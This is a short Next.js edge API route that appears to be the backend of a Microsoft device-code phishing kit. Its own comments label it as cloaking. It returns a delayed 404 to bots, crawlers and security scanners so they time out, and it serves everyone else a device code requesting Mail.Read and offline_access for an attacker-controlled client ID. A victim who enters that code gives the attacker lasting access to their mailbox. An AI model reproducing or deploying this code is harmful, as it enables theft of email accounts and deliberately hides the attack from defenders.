import { NextRequest, NextResponse } from 'next/server';

export const config = { runtime: 'edge' };

export default async function handler(req: NextRequest) {
  // CLOAKING: Anti-Bot & Data Center Filtering
  const ua = req.headers.get('user-agent') || '';
  const botKeywords = ['bot', 'crawler', 'spider', 'headless', 'lighthouse', 'inspect', 'cloud'];
  
  if (botKeywords.some(k => ua.toLowerCase().includes(k))) {
    // Artificial delay to exhaust scanner timeouts before 404
    await new Promise(r => setTimeout(r, 1500));
    return NextResponse.json({ error: 'Not Found' }, { status: 404 });
  }

  const CLIENT_ID = process.env.MSFT_CLIENT_ID;
  if (!CLIENT_ID) return NextResponse.json({ error: 'Config Missing' }, { status: 500 });

  try {
    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        scope: "openid profile offline_access https://graph.microsoft.com/Mail.Read"
      }),
    });
    const data = await response.json();
    return NextResponse.json({ ...data, client_id: CLIENT_ID });
  } catch (err) {
    return NextResponse.json({ error: 'Upstream Error' }, { status: 502 });
  }
}